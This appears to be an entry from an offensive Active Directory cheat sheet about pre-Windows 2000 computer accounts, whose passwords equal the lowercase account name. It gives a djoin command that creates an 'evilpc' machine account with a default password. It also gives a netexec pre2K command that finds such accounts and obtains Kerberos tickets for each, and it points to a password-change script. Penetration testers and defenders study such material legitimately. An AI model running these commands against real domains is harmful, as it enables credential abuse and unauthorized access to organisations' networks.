# Password - Pre-Created Computer Account

When `Assign this computer account as a pre-Windows 2000 computer` checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account **SERVERDEMO$** would have the password **serverdemo**. 

```ps1
# Create a machine with default password
# must be run from a domain joined device connected to the domain
djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc
```

* When you attempt to login using the credential you should have the following error code : `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.
* Then you need to change the password with [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304)


## Enumerate Pre-Created Computer Account

Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each

```ps1
nxc -u username -p password -M pre2K
```


## References

* [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)